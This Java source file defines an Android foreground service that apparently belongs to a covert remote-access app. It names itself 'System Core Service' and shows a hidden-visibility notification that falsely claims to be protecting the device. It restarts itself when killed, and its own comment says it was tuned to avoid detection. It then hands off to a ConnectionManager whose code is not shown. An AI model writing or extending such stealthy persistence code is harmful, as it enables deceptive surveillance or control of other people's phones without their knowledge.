package com.sys.service.manager;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class MainService extends Service {
    private static Context contextOfApplication;
    private static final String CHANNEL_ID = "SystemCoreChannel";

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        contextOfApplication = this;
        
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Servicio de Protección")
                .setContentText("Protegiendo el dispositivo...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        startForeground(1, notification);

        // Removed CPU WakeLock to drastically reduce battery consumption and avoid Doze Mode detection

        ConnectionManager.startAsync(this);
        return Service.START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Core Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }


}
